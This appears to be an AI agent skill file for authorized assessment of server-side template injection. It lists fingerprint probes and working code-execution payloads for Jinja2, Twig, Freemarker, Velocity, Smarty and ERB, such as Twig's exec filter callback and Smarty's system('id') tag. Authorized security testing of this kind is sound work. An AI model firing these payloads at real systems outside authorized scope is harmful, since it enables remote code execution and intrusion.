---
name: claude-ssti-security-skill
description: Assess server-side template contexts for unsafe expression evaluation and unintended code execution.
---

# SSTI security assessment

Assess server-side template contexts for unsafe expression evaluation and unintended code execution.

## Shared rules

Follow the authorization rules, assessment workflow, and finding format in [testing-rules](../testing-rules/SKILL.md). Load that skill before testing; do not proceed without confirmed authorization and scope.

## Category-specific focus

Use the prompts below to guide a focused **SSTI** review. Translate each hypothesis into a safe, authorized test and preserve the evidence needed to reproduce or remediate it.

## Confirmed vs. false positive

- **Confirmed when:** Template syntax placed in input is evaluated server-side (an expression executes, or OS/environment data is returned) rather than treated as literal text.
- **False positive when:** The syntax reflects back literally or escaped, or evaluation happens only inside a sandbox with no information disclosure or side effect.

## Prompt catalog

### 124. Template engine fingerprint

- **Difficulty:** EASY
- **Slug:** `template-engine-fingerprint`
- **Source prompt:** Submit `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `{{= 7*7 }}` in each input. `49` reveals the engine.
- **Steps:**
  1. Submit `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `{{= 7*7 }}` in each input.
  2. `49` reveals the engine.

### 125. Jinja2 RCE

- **Difficulty:** HARD
- **Slug:** `jinja2-rce`
- **Source prompt:** After fingerprint, escalate: `{{ ''.__class__.__mro__[1].__subclasses__() }}` → find Popen → execute.

### 126. Twig RCE

- **Difficulty:** HARD
- **Slug:** `twig-rce`
- **Source prompt:** `{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}`.

### 127. Freemarker RCE

- **Difficulty:** HARD
- **Slug:** `freemarker-rce`
- **Source prompt:** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`.

### 128. Velocity RCE

- **Difficulty:** HARD
- **Slug:** `velocity-rce`
- **Source prompt:** `#set($x = $rt.exec("id"))` after locating runtime ref.

### 129. Smarty RCE

- **Difficulty:** HARD
- **Slug:** `smarty-rce`
- **Source prompt:** `{php}system("id");{/php}` or `{system command="id"}`.

### 130. Mustache/Handlebars XSS

- **Difficulty:** MED
- **Slug:** `mustache-handlebars-xss`
- **Source prompt:** These are mostly XSS-safe but check helper registration on the server.

### 131. ERB / Rails RCE

- **Difficulty:** HARD
- **Slug:** `erb-rails-rce`
- **Source prompt:** `<%= system("id") %>` in any field reaching ERB rendering.

## Additional coverage

- Engine fingerprinting for Jinja2, Twig, Freemarker, Velocity, Thymeleaf, EJS, Pug, and related
  template systems.
- Context-aware expression probes, sandbox boundaries, and filter/canonicalization differences.
- SSTI-to-RCE assessment only with a harmless proof in an isolated environment.
